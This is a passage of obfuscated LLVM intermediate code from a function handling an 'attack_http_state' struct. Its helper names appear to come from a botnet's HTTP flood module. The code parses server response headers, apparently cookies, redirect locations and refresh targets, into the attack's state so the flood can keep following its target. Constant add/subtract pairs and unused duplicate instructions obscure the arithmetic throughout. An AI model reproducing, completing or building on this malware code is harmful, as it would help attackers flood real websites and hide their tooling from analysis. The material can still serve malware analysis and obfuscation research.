  %1404 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1403, i32 0, i32 15
  %1405 = load i32, i32* %1404, align 4
  %1406 = icmp slt i32 %1405, 5
  br label %1407

; <label>:1407:                                   ; preds = %1402, %1393
  %1408 = phi i1 [ false, %1393 ], [ %1406, %1402 ]
  br i1 %1408, label %1409, label %1620

; <label>:1409:                                   ; preds = %1407
  %1410 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1411 = load i32, i32* %37, align 4
  %1412 = sext i32 %1411 to i64
  %1413 = getelementptr inbounds i8, i8* %1410, i64 %1412
  %1414 = load i32, i32* %12, align 4
  %1415 = call i8* @table_retrieve_val(i32 46, i32* null)
  %1416 = call i32 @util_stristr(i8* %1413, i32 %1414, i8* %1415)
  store i32 %1416, i32* %47, align 4
  %1417 = load i32, i32* %37, align 4
  %1418 = load i32, i32* %47, align 4
  %1419 = add i32 %1417, 607724035
  %1420 = add i32 %1419, %1418
  %1421 = sub i32 %1420, 607724035
  %1422 = add nsw i32 %1417, %1418
  %1423 = sext i32 %1421 to i64
  %1424 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1423
  %1425 = load i8, i8* %1424, align 1
  %1426 = sext i8 %1425 to i32
  %1427 = icmp eq i32 %1426, 32
  br i1 %1427, label %1428, label %1434

; <label>:1428:                                   ; preds = %1409
  %1429 = load i32, i32* %47, align 4
  %1430 = add i32 %1429, 1282378505
  %1431 = add i32 %1430, 1
  %1432 = sub i32 %1431, 1282378505
  %1433 = add nsw i32 %1429, 1
  store i32 %1432, i32* %47, align 4
  br label %1434

; <label>:1434:                                   ; preds = %1428, %1409
  %1435 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1436 = load i32, i32* %37, align 4
  %1437 = sext i32 %1436 to i64
  %1438 = getelementptr inbounds i8, i8* %1435, i64 %1437
  %1439 = load i32, i32* %47, align 4
  %1440 = sext i32 %1439 to i64
  %1441 = getelementptr inbounds i8, i8* %1438, i64 %1440
  %1442 = load i32, i32* %12, align 4
  %1443 = load i32, i32* %37, align 4
  %1444 = add i32 %1442, -676173073
  %1445 = sub i32 %1444, %1443
  %1446 = sub i32 %1445, -676173073
  %1447 = sub nsw i32 %1442, %1443
  %1448 = load i32, i32* %47, align 4
  %1449 = add i32 %1446, 1258407359
  %1450 = sub i32 %1449, %1448
  %1451 = sub i32 %1450, 1258407359
  %1452 = sub nsw i32 %1446, %1448
  %1453 = call i32 @util_memsearch(i8* %1441, i32 %1451, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %1453, i32* %48, align 4
  %1454 = load i32, i32* %48, align 4
  %1455 = icmp ne i32 %1454, -1
  br i1 %1455, label %1456, label %1614

; <label>:1456:                                   ; preds = %1434
  %1457 = load i32, i32* %37, align 4
  %1458 = load i32, i32* %47, align 4
  %1459 = sub i32 %1457, -1160228598
  %1460 = add i32 %1459, %1458
  %1461 = add i32 %1460, -1160228598
  %1462 = add nsw i32 %1457, %1458
  %1463 = sext i32 %1461 to i64
  %1464 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1463
  store i8* %1464, i8** %49, align 8
  %1465 = load i32, i32* %48, align 4
  %1466 = icmp sge i32 %1465, 2
  br i1 %1466, label %1467, label %1473

; <label>:1467:                                   ; preds = %1456
  %1468 = load i32, i32* %48, align 4
  %1469 = add i32 %1468, 776516741
  %1470 = sub i32 %1469, 2
  %1471 = sub i32 %1470, 776516741
  %1472 = sub nsw i32 %1468, 2
  store i32 %1471, i32* %48, align 4
  br label %1473

; <label>:1473:                                   ; preds = %1467, %1456
  %1474 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1475 = load i32, i32* %37, align 4
  %1476 = sext i32 %1475 to i64
  %1477 = getelementptr inbounds i8, i8* %1474, i64 %1476
  %1478 = load i32, i32* %47, align 4
  %1479 = sext i32 %1478 to i64
  %1480 = getelementptr inbounds i8, i8* %1477, i64 %1479
  %1481 = load i32, i32* %12, align 4
  %1482 = load i32, i32* %37, align 4
  %1483 = add i32 %1481, 1567257047
  %1484 = sub i32 %1483, %1482
  %1485 = sub i32 %1484, 1567257047
  %1486 = sub nsw i32 %1481, %1482
  %1487 = load i32, i32* %47, align 4
  %1488 = sub i32 %1485, 1527087133
  %1489 = sub i32 %1488, %1487
  %1490 = add i32 %1489, 1527087133
  %1491 = sub nsw i32 %1485, %1487
  %1492 = call i32 @util_memsearch(i8* %1480, i32 %1490, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i32 0, i32 0), i32 1)
  %1493 = icmp sgt i32 %1492, 0
  br i1 %1493, label %1494, label %1517

; <label>:1494:                                   ; preds = %1473
  %1495 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1496 = load i32, i32* %37, align 4
  %1497 = sext i32 %1496 to i64
  %1498 = getelementptr inbounds i8, i8* %1495, i64 %1497
  %1499 = load i32, i32* %47, align 4
  %1500 = sext i32 %1499 to i64
  %1501 = getelementptr inbounds i8, i8* %1498, i64 %1500
  %1502 = load i32, i32* %12, align 4
  %1503 = load i32, i32* %37, align 4
  %1504 = add i32 %1502, -125978319
  %1505 = sub i32 %1504, %1503
  %1506 = sub i32 %1505, -125978319
  %1507 = sub nsw i32 %1502, %1503
  %1508 = load i32, i32* %47, align 4
  %1509 = sub i32 %1506, -1980263475
  %1510 = sub i32 %1509, %1508
  %1511 = add i32 %1510, -1980263475
  %1512 = sub nsw i32 %1506, %1508
  %1513 = call i32 @util_memsearch(i8* %1501, i32 %1511, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i32 0, i32 0), i32 1)
  %1514 = sub i32 0, 1
  %1515 = add i32 %1513, %1514
  %1516 = sub nsw i32 %1513, 1
  store i32 %1515, i32* %48, align 4
  br label %1517

; <label>:1517:                                   ; preds = %1494, %1473
  %1518 = load i32, i32* %37, align 4
  %1519 = load i32, i32* %47, align 4
  %1520 = sub i32 0, %1519
  %1521 = sub i32 %1518, %1520
  %1522 = add nsw i32 %1518, %1519
  %1523 = load i32, i32* %48, align 4
  %1524 = sub i32 0, %1523
  %1525 = sub i32 %1521, %1524
  %1526 = add nsw i32 %1521, %1523
  %1527 = sext i32 %1525 to i64
  %1528 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1527
  store i8 0, i8* %1528, align 1
  store i32 0, i32* %10, align 4
  br label %1529

; <label>:1529:                                   ; preds = %1544, %1517
  %1530 = load i32, i32* %10, align 4
  %1531 = load i8*, i8** %49, align 8
  %1532 = call i32 @util_strlen(i8* %1531)
  %1533 = icmp slt i32 %1530, %1532
  br i1 %1533, label %1534, label %1551

; <label>:1534:                                   ; preds = %1529
  %1535 = load i8*, i8** %49, align 8
  %1536 = load i32, i32* %10, align 4
  %1537 = sext i32 %1536 to i64
  %1538 = getelementptr inbounds i8, i8* %1535, i64 %1537
  %1539 = load i8, i8* %1538, align 1
  %1540 = sext i8 %1539 to i32
  %1541 = icmp eq i32 %1540, 61
  br i1 %1541, label %1542, label %1543

; <label>:1542:                                   ; preds = %1534
  br label %1551

; <label>:1543:                                   ; preds = %1534
  br label %1544

; <label>:1544:                                   ; preds = %1543
  %1545 = load i32, i32* %10, align 4
  %1546 = sub i32 0, %1545
  %1547 = sub i32 0, 1
  %1548 = add i32 %1546, %1547
  %1549 = sub i32 0, %1548
  %1550 = add nsw i32 %1545, 1
  store i32 %1549, i32* %10, align 4
  br label %1529

; <label>:1551:                                   ; preds = %1542, %1529
  %1552 = load i8*, i8** %49, align 8
  %1553 = load i32, i32* %10, align 4
  %1554 = sext i32 %1553 to i64
  %1555 = getelementptr inbounds i8, i8* %1552, i64 %1554
  %1556 = load i8, i8* %1555, align 1
  %1557 = sext i8 %1556 to i32
  %1558 = icmp eq i32 %1557, 61
  br i1 %1558, label %1559, label %1613

; <label>:1559:                                   ; preds = %1551
  %1560 = load i32, i32* %10, align 4
  store i32 %1560, i32* %50, align 4
  store i32 0, i32* %51, align 4
  store i32 0, i32* %10, align 4
  br label %1561

; <label>:1561:                                   ; preds = %1580, %1559
  %1562 = load i32, i32* %10, align 4
  %1563 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1564 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1563, i32 0, i32 15
  %1565 = load i32, i32* %1564, align 4
  %1566 = icmp slt i32 %1562, %1565
  br i1 %1566, label %1567, label %1586

; <label>:1567:                                   ; preds = %1561
  %1568 = load i8*, i8** %49, align 8
  %1569 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1570 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1569, i32 0, i32 16
  %1571 = load i32, i32* %10, align 4
  %1572 = sext i32 %1571 to i64
  %1573 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %1570, i64 0, i64 %1572
  %1574 = getelementptr inbounds [128 x i8], [128 x i8]* %1573, i32 0, i32 0
  %1575 = load i32, i32* %50, align 4
  %1576 = call signext i8 @util_strncmp(i8* %1568, i8* %1574, i32 %1575)
  %1577 = icmp ne i8 %1576, 0
  br i1 %1577, label %1578, label %1579

; <label>:1578:                                   ; preds = %1567
  store i32 1, i32* %51, align 4
  br label %1586

; <label>:1579:                                   ; preds = %1567
  br label %1580

; <label>:1580:                                   ; preds = %1579
  %1581 = load i32, i32* %10, align 4
  %1582 = sub i32 %1581, -1729031012
  %1583 = add i32 %1582, 1
  %1584 = add i32 %1583, -1729031012
  %1585 = add nsw i32 %1581, 1
  store i32 %1584, i32* %10, align 4
  br label %1561

; <label>:1586:                                   ; preds = %1578, %1561
  %1587 = load i32, i32* %51, align 4
  %1588 = icmp ne i32 %1587, 0
  br i1 %1588, label %1612, label %1589

; <label>:1589:                                   ; preds = %1586
  %1590 = load i8*, i8** %49, align 8
  %1591 = call i32 @util_strlen(i8* %1590)
  %1592 = icmp slt i32 %1591, 128
  br i1 %1592, label %1593, label %1611

; <label>:1593:                                   ; preds = %1589
  %1594 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1595 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1594, i32 0, i32 16
  %1596 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1597 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1596, i32 0, i32 15
  %1598 = load i32, i32* %1597, align 4
  %1599 = sext i32 %1598 to i64
  %1600 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %1595, i64 0, i64 %1599
  %1601 = getelementptr inbounds [128 x i8], [128 x i8]* %1600, i32 0, i32 0
  %1602 = load i8*, i8** %49, align 8
  %1603 = call i32 @util_strcpy(i8* %1601, i8* %1602)
  %1604 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1605 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1604, i32 0, i32 15
  %1606 = load i32, i32* %1605, align 4
  %1607 = sub i32 %1606, 1519530399
  %1608 = add i32 %1607, 1
  %1609 = add i32 %1608, 1519530399
  %1610 = add nsw i32 %1606, 1
  store i32 %1609, i32* %1605, align 4
  br label %1611

; <label>:1611:                                   ; preds = %1593, %1589
  br label %1612

; <label>:1612:                                   ; preds = %1611, %1586
  br label %1613

; <label>:1613:                                   ; preds = %1612, %1551
  br label %1614

; <label>:1614:                                   ; preds = %1613, %1434
  %1615 = load i32, i32* %47, align 4
  %1616 = load i32, i32* %37, align 4
  %1617 = sub i32 0, %1615
  %1618 = sub i32 %1616, %1617
  %1619 = add nsw i32 %1616, %1615
  store i32 %1618, i32* %37, align 4
  br label %1393

; <label>:1620:                                   ; preds = %1407
  %1621 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1622 = load i32, i32* %12, align 4
  %1623 = call i8* @table_retrieve_val(i32 45, i32* null)
  %1624 = call i32 @util_stristr(i8* %1621, i32 %1622, i8* %1623)
  %1625 = icmp ne i32 %1624, -1
  br i1 %1625, label %1626, label %1845

; <label>:1626:                                   ; preds = %1620
  %1627 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1628 = load i32, i32* %12, align 4
  %1629 = call i8* @table_retrieve_val(i32 45, i32* null)
  %1630 = call i32 @util_stristr(i8* %1627, i32 %1628, i8* %1629)
  store i32 %1630, i32* %52, align 4
  %1631 = load i32, i32* %52, align 4
  %1632 = sext i32 %1631 to i64
  %1633 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1632
  %1634 = load i8, i8* %1633, align 1
  %1635 = sext i8 %1634 to i32
  %1636 = icmp eq i32 %1635, 32
  br i1 %1636, label %1637, label %1643

; <label>:1637:                                   ; preds = %1626
  %1638 = load i32, i32* %52, align 4
  %1639 = add i32 %1638, 412909332
  %1640 = add i32 %1639, 1
  %1641 = sub i32 %1640, 412909332
  %1642 = add nsw i32 %1638, 1
  store i32 %1641, i32* %52, align 4
  br label %1643

; <label>:1643:                                   ; preds = %1637, %1626
  %1644 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1645 = load i32, i32* %52, align 4
  %1646 = sext i32 %1645 to i64
  %1647 = getelementptr inbounds i8, i8* %1644, i64 %1646
  %1648 = load i32, i32* %12, align 4
  %1649 = load i32, i32* %52, align 4
  %1650 = add i32 %1648, 1666517225
  %1651 = sub i32 %1650, %1649
  %1652 = sub i32 %1651, 1666517225
  %1653 = sub nsw i32 %1648, %1649
  %1654 = call i32 @util_memsearch(i8* %1647, i32 %1652, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %1654, i32* %53, align 4
  %1655 = load i32, i32* %53, align 4
  %1656 = icmp ne i32 %1655, -1
  br i1 %1656, label %1657, label %1844

; <label>:1657:                                   ; preds = %1643
  %1658 = load i32, i32* %52, align 4
  %1659 = sext i32 %1658 to i64
  %1660 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1659
  store i8* %1660, i8** %54, align 8
  %1661 = load i32, i32* %53, align 4
  %1662 = icmp sge i32 %1661, 2
  br i1 %1662, label %1663, label %1668

; <label>:1663:                                   ; preds = %1657
  %1664 = load i32, i32* %53, align 4
  %1665 = sub i32 0, 2
  %1666 = add i32 %1664, %1665
  %1667 = sub nsw i32 %1664, 2
  store i32 %1666, i32* %53, align 4
  br label %1668

; <label>:1668:                                   ; preds = %1663, %1657
  %1669 = load i32, i32* %52, align 4
  %1670 = load i32, i32* %53, align 4
  %1671 = sub i32 0, %1670
  %1672 = sub i32 %1669, %1671
  %1673 = add nsw i32 %1669, %1670
  %1674 = sext i32 %1672 to i64
  %1675 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1674
  store i8 0, i8* %1675, align 1
  %1676 = load i32, i32* %53, align 4
  %1677 = sub i32 %1676, 1584993650
  %1678 = add i32 %1677, 1
  %1679 = add i32 %1678, 1584993650
  %1680 = add nsw i32 %1676, 1
  store i32 %1679, i32* %53, align 4
  %1681 = load i8*, i8** %54, align 8
  %1682 = load i32, i32* %53, align 4
  %1683 = call i32 @util_memsearch(i8* %1681, i32 %1682, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.10, i32 0, i32 0), i32 4)
  %1684 = icmp eq i32 %1683, 4
  br i1 %1684, label %1685, label %1791

; <label>:1685:                                   ; preds = %1668
  store i32 7, i32* %10, align 4
  %1686 = load i8*, i8** %54, align 8
  %1687 = getelementptr inbounds i8, i8* %1686, i64 4
  %1688 = load i8, i8* %1687, align 1
  %1689 = sext i8 %1688 to i32
  %1690 = icmp eq i32 %1689, 115
  br i1 %1690, label %1691, label %1697

; <label>:1691:                                   ; preds = %1685
  %1692 = load i32, i32* %10, align 4
  %1693 = add i32 %1692, 1892325719
  %1694 = add i32 %1693, 1
  %1695 = sub i32 %1694, 1892325719
  %1696 = add nsw i32 %1692, 1
  store i32 %1695, i32* %10, align 4
  br label %1697

; <label>:1697:                                   ; preds = %1691, %1685
  %1698 = load i8*, i8** %54, align 8
  %1699 = load i8*, i8** %54, align 8
  %1700 = load i32, i32* %10, align 4
  %1701 = sext i32 %1700 to i64
  %1702 = getelementptr inbounds i8, i8* %1699, i64 %1701
  %1703 = load i32, i32* %53, align 4
  %1704 = load i32, i32* %10, align 4
  %1705 = add i32 %1703, 1744810318
  %1706 = sub i32 %1705, %1704
  %1707 = sub i32 %1706, 1744810318
  %1708 = sub nsw i32 %1703, %1704
  %1709 = sext i32 %1707 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %1698, i8* %1702, i64 %1709, i32 1, i1 false)
  store i32 0, i32* %10, align 4
  br label %1710

; <label>:1710:                                   ; preds = %1731, %1697
  %1711 = load i8*, i8** %54, align 8
  %1712 = load i32, i32* %10, align 4
  %1713 = sext i32 %1712 to i64
  %1714 = getelementptr inbounds i8, i8* %1711, i64 %1713
  %1715 = load i8, i8* %1714, align 1
  %1716 = sext i8 %1715 to i32
  %1717 = icmp ne i32 %1716, 0
  br i1 %1717, label %1718, label %1736

; <label>:1718:                                   ; preds = %1710
  %1719 = load i8*, i8** %54, align 8
  %1720 = load i32, i32* %10, align 4
  %1721 = sext i32 %1720 to i64
  %1722 = getelementptr inbounds i8, i8* %1719, i64 %1721
  %1723 = load i8, i8* %1722, align 1
  %1724 = sext i8 %1723 to i32
  %1725 = icmp eq i32 %1724, 47
  br i1 %1725, label %1726, label %1731

; <label>:1726:                                   ; preds = %1718
  %1727 = load i8*, i8** %54, align 8
  %1728 = load i32, i32* %10, align 4
  %1729 = sext i32 %1728 to i64
  %1730 = getelementptr inbounds i8, i8* %1727, i64 %1729
  store i8 0, i8* %1730, align 1
  br label %1736

; <label>:1731:                                   ; preds = %1718
  %1732 = load i32, i32* %10, align 4
  %1733 = sub i32 0, 1
  %1734 = sub i32 %1732, %1733
  %1735 = add nsw i32 %1732, 1
  store i32 %1734, i32* %10, align 4
  br label %1710

; <label>:1736:                                   ; preds = %1726, %1710
  %1737 = load i8*, i8** %54, align 8
  %1738 = call i32 @util_strlen(i8* %1737)
  %1739 = icmp sgt i32 %1738, 0
  br i1 %1739, label %1740, label %1750

; <label>:1740:                                   ; preds = %1736
  %1741 = load i8*, i8** %54, align 8
  %1742 = call i32 @util_strlen(i8* %1741)
  %1743 = icmp slt i32 %1742, 128
  br i1 %1743, label %1744, label %1750

; <label>:1744:                                   ; preds = %1740
  %1745 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1746 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1745, i32 0, i32 7
  %1747 = getelementptr inbounds [129 x i8], [129 x i8]* %1746, i32 0, i32 0
  %1748 = load i8*, i8** %54, align 8
  %1749 = call i32 @util_strcpy(i8* %1747, i8* %1748)
  br label %1750

; <label>:1750:                                   ; preds = %1744, %1740, %1736
  %1751 = load i8*, i8** %54, align 8
  %1752 = load i32, i32* %10, align 4
  %1753 = sub i32 0, 1
  %1754 = sub i32 %1752, %1753
  %1755 = add nsw i32 %1752, 1
  %1756 = sext i32 %1754 to i64
  %1757 = getelementptr inbounds i8, i8* %1751, i64 %1756
  %1758 = call i32 @util_strlen(i8* %1757)
  %1759 = icmp slt i32 %1758, 256
  br i1 %1759, label %1760, label %1790

; <label>:1760:                                   ; preds = %1750
  %1761 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1762 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1761, i32 0, i32 6
  %1763 = getelementptr inbounds [257 x i8], [257 x i8]* %1762, i32 0, i32 0
  %1764 = getelementptr inbounds i8, i8* %1763, i64 1
  call void @util_zero(i8* %1764, i32 255)
  %1765 = load i8*, i8** %54, align 8
  %1766 = load i32, i32* %10, align 4
  %1767 = add i32 %1766, 2026509691
  %1768 = add i32 %1767, 1
  %1769 = sub i32 %1768, 2026509691
  %1770 = add nsw i32 %1766, 1
  %1771 = sext i32 %1769 to i64
  %1772 = getelementptr inbounds i8, i8* %1765, i64 %1771
  %1773 = call i32 @util_strlen(i8* %1772)
  %1774 = icmp sgt i32 %1773, 0
  br i1 %1774, label %1775, label %1789

; <label>:1775:                                   ; preds = %1760
  %1776 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1777 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1776, i32 0, i32 6
  %1778 = getelementptr inbounds [257 x i8], [257 x i8]* %1777, i32 0, i32 0
  %1779 = getelementptr inbounds i8, i8* %1778, i64 1
  %1780 = load i8*, i8** %54, align 8
  %1781 = load i32, i32* %10, align 4
  %1782 = sub i32 %1781, -1726207398
  %1783 = add i32 %1782, 1
  %1784 = add i32 %1783, -1726207398
  %1785 = add nsw i32 %1781, 1
  %1786 = sext i32 %1784 to i64
  %1787 = getelementptr inbounds i8, i8* %1780, i64 %1786
  %1788 = call i32 @util_strcpy(i8* %1779, i8* %1787)
  br label %1789

; <label>:1789:                                   ; preds = %1775, %1760
  br label %1790

; <label>:1790:                                   ; preds = %1789, %1750
  br label %1841

; <label>:1791:                                   ; preds = %1668
  %1792 = load i8*, i8** %54, align 8
  %1793 = getelementptr inbounds i8, i8* %1792, i64 0
  %1794 = load i8, i8* %1793, align 1
  %1795 = sext i8 %1794 to i32
  %1796 = icmp eq i32 %1795, 47
  br i1 %1796, label %1797, label %1840

; <label>:1797:                                   ; preds = %1791
  %1798 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1799 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1798, i32 0, i32 6
  %1800 = getelementptr inbounds [257 x i8], [257 x i8]* %1799, i32 0, i32 0
  %1801 = getelementptr inbounds i8, i8* %1800, i64 1
  call void @util_zero(i8* %1801, i32 255)
  %1802 = load i8*, i8** %54, align 8
  %1803 = load i32, i32* %10, align 4
  %1804 = sub i32 0, %1803
  %1805 = sub i32 0, 1
  %1806 = add i32 %1804, %1805
  %1807 = sub i32 0, %1806
  %1808 = add nsw i32 %1803, 1
  %1809 = sext i32 %1807 to i64
  %1810 = getelementptr inbounds i8, i8* %1802, i64 %1809
  %1811 = call i32 @util_strlen(i8* %1810)
  %1812 = icmp sgt i32 %1811, 0
  br i1 %1812, label %1813, label %1839

; <label>:1813:                                   ; preds = %1797
  %1814 = load i8*, i8** %54, align 8
  %1815 = load i32, i32* %10, align 4
  %1816 = sub i32 0, %1815
  %1817 = sub i32 0, 1
  %1818 = add i32 %1816, %1817
  %1819 = sub i32 0, %1818
  %1820 = add nsw i32 %1815, 1
  %1821 = sext i32 %1819 to i64
  %1822 = getelementptr inbounds i8, i8* %1814, i64 %1821
  %1823 = call i32 @util_strlen(i8* %1822)
  %1824 = icmp slt i32 %1823, 256
  br i1 %1824, label %1825, label %1839

; <label>:1825:                                   ; preds = %1813
  %1826 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1827 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1826, i32 0, i32 6
  %1828 = getelementptr inbounds [257 x i8], [257 x i8]* %1827, i32 0, i32 0
  %1829 = getelementptr inbounds i8, i8* %1828, i64 1
  %1830 = load i8*, i8** %54, align 8
  %1831 = load i32, i32* %10, align 4
  %1832 = add i32 %1831, 539091339
  %1833 = add i32 %1832, 1
  %1834 = sub i32 %1833, 539091339
  %1835 = add nsw i32 %1831, 1
  %1836 = sext i32 %1834 to i64
  %1837 = getelementptr inbounds i8, i8* %1830, i64 %1836
  %1838 = call i32 @util_strcpy(i8* %1829, i8* %1837)
  br label %1839

; <label>:1839:                                   ; preds = %1825, %1813, %1797
  br label %1840

; <label>:1840:                                   ; preds = %1839, %1791
  br label %1841

; <label>:1841:                                   ; preds = %1840, %1790
  %1842 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1843 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1842, i32 0, i32 1
  store i8 1, i8* %1843, align 4
  br label %2768

; <label>:1844:                                   ; preds = %1643
  br label %1845

; <label>:1845:                                   ; preds = %1844, %1620
  %1846 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1847 = load i32, i32* %12, align 4
  %1848 = call i8* @table_retrieve_val(i32 44, i32* null)
  %1849 = call i32 @util_stristr(i8* %1846, i32 %1847, i8* %1848)
  %1850 = icmp ne i32 %1849, -1
  br i1 %1850, label %1851, label %2244

; <label>:1851:                                   ; preds = %1845
  %1852 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1853 = load i32, i32* %12, align 4
  %1854 = call i8* @table_retrieve_val(i32 44, i32* null)
  %1855 = call i32 @util_stristr(i8* %1852, i32 %1853, i8* %1854)
  store i32 %1855, i32* %55, align 4
  %1856 = load i32, i32* %55, align 4
  %1857 = sext i32 %1856 to i64
  %1858 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1857
  %1859 = load i8, i8* %1858, align 1
  %1860 = sext i8 %1859 to i32
  %1861 = icmp eq i32 %1860, 32
  br i1 %1861, label %1862, label %1868

; <label>:1862:                                   ; preds = %1851
  %1863 = load i32, i32* %55, align 4
  %1864 = sub i32 %1863, -906183285
  %1865 = add i32 %1864, 1
  %1866 = add i32 %1865, -906183285
  %1867 = add nsw i32 %1863, 1
  store i32 %1866, i32* %55, align 4
  br label %1868

; <label>:1868:                                   ; preds = %1862, %1851
  %1869 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1870 = load i32, i32* %55, align 4
  %1871 = sext i32 %1870 to i64
  %1872 = getelementptr inbounds i8, i8* %1869, i64 %1871
  %1873 = load i32, i32* %12, align 4
  %1874 = load i32, i32* %55, align 4
  %1875 = sub i32 0, %1874
  %1876 = add i32 %1873, %1875
  %1877 = sub nsw i32 %1873, %1874
  %1878 = call i32 @util_memsearch(i8* %1872, i32 %1876, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %1878, i32* %56, align 4
  %1879 = load i32, i32* %56, align 4
  %1880 = icmp ne i32 %1879, -1
  br i1 %1880, label %1881, label %2243

; <label>:1881:                                   ; preds = %1868
  %1882 = load i32, i32* %55, align 4
  %1883 = sext i32 %1882 to i64
  %1884 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1883
  store i8* %1884, i8** %57, align 8
  %1885 = load i32, i32* %56, align 4
  %1886 = icmp sge i32 %1885, 2
  br i1 %1886, label %1887, label %1892

; <label>:1887:                                   ; preds = %1881
  %1888 = load i32, i32* %56, align 4
  %1889 = sub i32 0, 2
  %1890 = add i32 %1888, %1889
  %1891 = sub nsw i32 %1888, 2
  store i32 %1890, i32* %56, align 4
  br label %1892

; <label>:1892:                                   ; preds = %1887, %1881
  %1893 = load i32, i32* %55, align 4
  %1894 = load i32, i32* %56, align 4
  %1895 = sub i32 0, %1893
  %1896 = sub i32 0, %1894
  %1897 = add i32 %1895, %1896
  %1898 = sub i32 0, %1897
  %1899 = add nsw i32 %1893, %1894
  %1900 = sext i32 %1898 to i64
  %1901 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1900
  store i8 0, i8* %1901, align 1
  %1902 = load i32, i32* %56, align 4
  %1903 = sub i32 0, %1902
  %1904 = sub i32 0, 1
  %1905 = add i32 %1903, %1904
  %1906 = sub i32 0, %1905
  %1907 = add nsw i32 %1902, 1
  store i32 %1906, i32* %56, align 4
  store i32 0, i32* %10, align 4
  br label %1908

; <label>:1908:                                   ; preds = %1934, %1892
  %1909 = load i8*, i8** %57, align 8
  %1910 = load i32, i32* %10, align 4
  %1911 = sext i32 %1910 to i64
  %1912 = getelementptr inbounds i8, i8* %1909, i64 %1911
  %1913 = load i8, i8* %1912, align 1
  %1914 = sext i8 %1913 to i32
  %1915 = icmp ne i32 %1914, 0
  br i1 %1915, label %1916, label %1932

; <label>:1916:                                   ; preds = %1908
  %1917 = load i8*, i8** %57, align 8
  %1918 = load i32, i32* %10, align 4
  %1919 = sext i32 %1918 to i64
  %1920 = getelementptr inbounds i8, i8* %1917, i64 %1919
  %1921 = load i8, i8* %1920, align 1
  %1922 = sext i8 %1921 to i32
  %1923 = icmp sge i32 %1922, 48
  br i1 %1923, label %1924, label %1932

; <label>:1924:                                   ; preds = %1916
  %1925 = load i8*, i8** %57, align 8
  %1926 = load i32, i32* %10, align 4
  %1927 = sext i32 %1926 to i64
  %1928 = getelementptr inbounds i8, i8* %1925, i64 %1927
  %1929 = load i8, i8* %1928, align 1
  %1930 = sext i8 %1929 to i32
  %1931 = icmp sle i32 %1930, 57
  br label %1932

; <label>:1932:                                   ; preds = %1924, %1916, %1908
  %1933 = phi i1 [ false, %1916 ], [ false, %1908 ], [ %1931, %1924 ]
  br i1 %1933, label %1934, label %1941

; <label>:1934:                                   ; preds = %1932
  %1935 = load i32, i32* %10, align 4
  %1936 = sub i32 0, %1935
  %1937 = sub i32 0, 1
  %1938 = add i32 %1936, %1937
  %1939 = sub i32 0, %1938
  %1940 = add nsw i32 %1935, 1
  store i32 %1939, i32* %10, align 4
  br label %1908

; <label>:1941:                                   ; preds = %1932
  %1942 = load i8*, i8** %57, align 8
  %1943 = load i32, i32* %10, align 4
  %1944 = sext i32 %1943 to i64
  %1945 = getelementptr inbounds i8, i8* %1942, i64 %1944
  %1946 = load i8, i8* %1945, align 1
  %1947 = sext i8 %1946 to i32
  %1948 = icmp ne i32 %1947, 0
  br i1 %1948, label %1949, label %2242

